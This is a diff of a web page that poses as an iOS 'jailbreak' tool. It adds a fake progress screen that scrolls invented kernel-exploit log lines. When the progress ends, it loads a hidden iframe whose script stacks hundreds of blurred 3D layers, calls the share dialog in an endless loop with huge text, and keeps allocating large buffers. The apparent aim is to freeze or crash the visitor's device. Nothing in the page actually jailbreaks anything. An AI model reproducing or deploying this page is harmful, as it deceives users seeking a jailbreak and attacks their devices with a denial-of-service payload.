@@ -3,180 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol: PHOENIX</title>
+    <title>Jailbreak in Progress...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "ui-monospace", monospace;
-            margin: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            /* Глубокий черный фон */
-            background: #000;
-            color: #ff3b30; /* Зловещий неоново-красный */
+            background-color: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
             overflow: hidden;
-            position: relative;
+            user-select: none;
         }
-
-        /* Текстура шума поверх всего фона */
-        body::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyIiBoZWlnaHQ9IjIiIHZpZXdCb3g9IjAgMCAyIDIiPjxnPjxjaXJjbGUgY3g9IjEiIGN5PSIxIiByPSIxIiBmaWxsPSJyZ2JhKDI1NSwyNTUsMjU1LDAuMDUpIi8+PC9nPjwvc3ZnPg==');
-            background-repeat: repeat;
-            opacity: 0.15;
-            pointer-events: none;
-            z-index: 1;
+        .font-mono {
+            font-family: 'JetBrains Mono', monospace;
         }
-
-        #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; display: none; }
-
-        .main-card {
-            background: rgba(0, 0, 0, 0.9);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 59, 48, 0.2);
-            border-radius: 12px;
-            padding: 40px 25px;
-            width: 85%;
-            max-width: 360px;
-            text-align: center;
-            box-shadow: 0 40px 120px rgba(0, 0, 0, 0.8), 0 0 30px rgba(255, 59, 48, 0.1);
-            z-index: 10;
-            position: relative;
-            
-            opacity: 0;
-            transform: scale(0.95);
-            animation: fadeIn 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
+        .console-container::-webkit-scrollbar {
+            width: 0px;
         }
-
-        @keyframes fadeIn {
-            to {
-                opacity: 1;
-                transform: scale(1);
-            }
+        @keyframes blink {
+            50% { opacity: 0; }
         }
-
-        .verified-badge {
-            display: inline-flex;
-            align-items: center;
-            background: rgba(255, 59, 48, 0.1);
-            color: #ff3b30;
-            padding: 5px 12px;
-            border-radius: 4px;
-            font-size: 10px;
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-bottom: 15px;
-            border: 1px solid rgba(255, 59, 48, 0.2);
-        }
-
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 900;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            line-height: 1.1;
-            margin-bottom: 5px;
-            color: #fff;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-        }
-
-        .server-status { 
-            font-size: 10px; 
-            color: #ff3b30; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            gap: 5px; 
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .status-dot { 
-            width: 5px; 
-            height: 5px; 
-            background: #ff3b30; 
-            border-radius: 50%; 
-            animation: pulse 1.5s infinite; 
-            box-shadow: 0 0 5px #ff3b30;
-        }
-        
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-        .device-info {
-            background: rgba(255, 59, 48, 0.05);
-            border-radius: 8px;
-            padding: 20px;
-            margin: 20px 0;
-            font-family: 'SF Mono', monospace;
-            font-size: 11px;
-            color: #fff;
-            text-align: left;
-            border: 1px solid rgba(255, 59, 48, 0.1);
-        }
-
-        .info-line { margin-bottom: 8px; display: flex; justify-content: space-between; }
-        .info-line span { color: #555; }
-        .red-val { color: #ff3b30; font-weight: bold; }
-
-        .btn-jailbreak {
-            background: transparent;
-            color: #ff3b30;
-            border: 1px solid #ff3b30;
-            padding: 16px 0;
-            width: 100%;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 4px;
-            text-decoration: none;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            transition: all 0.2s;
-            margin-bottom: 15px;
-        }
-        
-        .btn-jailbreak:hover {
-            background: rgba(255, 59, 48, 0.05);
-            box-shadow: 0 0 15px rgba(255, 59, 48, 0.1);
-        }
-
-        .btn-jailbreak:active { transform: scale(0.98); background: rgba(255, 59, 48, 0.1); }
-
-        .footer { 
-            margin-top: 15px; 
-            font-size: 9px; 
-            color: #333; 
-            line-height: 1.4;
-            text-transform: none;
+        .cursor {
+            display: inline-block;
+            width: 6px;
+            height: 12px;
+            background: #fff;
+            animation: blink 1s step-end infinite;
+            vertical-align: middle;
+            margin-left: 2px;
         }
     </style>
 </head>
-<body>
-    <canvas id="rainCanvas"></canvas>
-    
-    <div class="main-card">
-        <div class="verified-badge">✓ Secure Link established</div>
-        <h1>Protocol: PHOENIX</h1>
-        <div class="server-status">
-            <div class="status-dot"></div> Exploit Nodes: Online
+<body class="min-h-screen flex flex-col items-center justify-center p-6 bg-black">
+
+    <div id="simulation" class="w-full max-w-2xl space-y-10">
+        <!-- Status Header -->
+        <div class="flex items-center justify-between px-2">
+            <div class="flex items-center gap-3">
+                <i data-lucide="loader-2" class="w-5 h-5 animate-spin text-white/40"></i>
+                <span class="font-mono text-xs tracking-widest uppercase text-white/50">Injecting Exploit...</span>
+            </div>
+            <span id="pct" class="font-mono text-sm font-bold">0%</span>
         </div>
 
-        <div class="device-info">
-            <div class="info-line"><span>Target:</span> <span class="red-val">iOS 15.0 - 26.x</span></div>
-            <div class="info-line"><span>Method:</span> <span class="red-val">Kernel Exploit</span></div>
-            <div class="info-line"><span>Safety:</span> <span class="red-val">100% Secure</span></div>
+        <!-- Progress Bar -->
+        <div class="relative h-1 w-full bg-white/5 rounded-full overflow-hidden">
+            <div id="bar" class="absolute inset-y-0 left-0 bg-white transition-all duration-100" style="width: 0%"></div>
         </div>
-        
-        <a href="second.html" class="btn-jailbreak">Execute Exploit</a>
 
-        <div class="footer">
-            Original code by <b>neonmodder123</b><br>
-            Authorized repository: Vitya<br>
-            © 2026 Protocol Phoenix
+        <!-- Terminal -->
+        <div id="terminal" class="h-80 bg-white/[0.02] border border-white/5 rounded-3xl p-8 font-mono text-[10px] overflow-y-auto space-y-3 leading-relaxed">
         </div>
     </div>
+
+    <!-- Error Screen -->
+    <div id="error-screen" class="hidden fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black">
+        <p id="fatal" class="hidden text-red-600 font-mono text-[8px] uppercase tracking-[0.5em] mb-4">Fatal Error: Kernel Panic</p>
+        <div class="opacity-10 scale-75">
+            <i data-lucide="shield-alert" class="w-12 h-12"></i>
+        </div>
+    </div>
+
+    <!-- Respring Hook -->
+    <div id="respring-view" class="hidden fixed inset-0 z-[200] bg-black flex flex-col items-center justify-center space-y-6">
+        <i data-lucide="loader-2" class="w-10 h-10 animate-spin text-white/30"></i>
+        <p class="font-mono text-[10px] tracking-widest text-white/20 uppercase">System Respring</p>
+    </div>
+
+    <iframe id="hook" class="fixed pointer-events-none opacity-0 w-1 h-1" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
+    <script>
+        lucide.createIcons();
+
+        const commands = [
+            "Opening socket on port 1337...",
+            "Overwriting kptr_restrict...",
+            "Executing task_for_pid(0)...",
+            "Kernel base found at 0xFFFFFFF007004000",
+            "Bypassing KPP (Kernel Patch Protection)...",
+            "Applying AMFI patches...",
+            "Mounting / (rootfs) as r/w...",
+            "Extracting bootstrap.tar.gz...",
+            "Cleaning up auxiliary files...",
+            "Jailbreak success. Triggering final stage..."
+        ];
+
+        let idx = 0;
+        let p = 0;
+        const term = document.getElementById('terminal');
+
+        function log() {
+            if (idx < commands.length) {
+                const row = document.createElement('div');
+                row.className = 'text-white/60';
+                row.innerHTML = `<span class="text-white/20">></span> ${commands[idx]}`;
+                term.appendChild(row);
+                term.scrollTop = term.scrollHeight;
+                idx++;
+            }
+        }
+
+        const run = setInterval(() => {
+            p += 0.8;
+            if (p > 100) p = 100;
+            
+            document.getElementById('bar').style.width = p + '%';
+            document.getElementById('pct').innerText = Math.floor(p) + '%';
+
+            if (Math.random() > 0.9) log();
+
+            if (p >= 100) {
+                clearInterval(run);
+                setTimeout(end, 800);
+            }
+        }, 40);
+
+        function end() {
+            document.getElementById('simulation').classList.add('hidden');
+            document.getElementById('error-screen').classList.remove('hidden');
+            
+            setTimeout(() => {
+                document.getElementById('fatal').classList.remove('hidden');
+                setTimeout(respring, 1200);
+            }, 400);
+        }
+
+        function respring() {
+            document.getElementById('error-screen').classList.add('hidden');
+            document.getElementById('respring-view').classList.remove('hidden');
+
+            const frame = document.getElementById('hook');
+            frame.srcdoc = `
+                <html><body style="background:black">
+                <script>
+                    const c = document.createElement('div');
+                    c.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                    document.body.appendChild(c);
+                    for(let i=0; i<500; i++){
+                        let d = document.createElement('div');
+                        d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, '+i+'px) rotateY(90deg); opacity: 0.99;';
+                        c.appendChild(d);
+                    }
+                    setInterval(() => {
+                        try { navigator.share({ title: 'R', text: 'R'.repeat(100000) }); } catch(e) {}
+                        let x = new Uint8Array(1024*1024*20);
+                        crypto.getRandomValues(x);
+                    }, 0);
+                <\/script>
+                </body></html>
+            `;
+        }
+    </script>
+</body>
+</html>
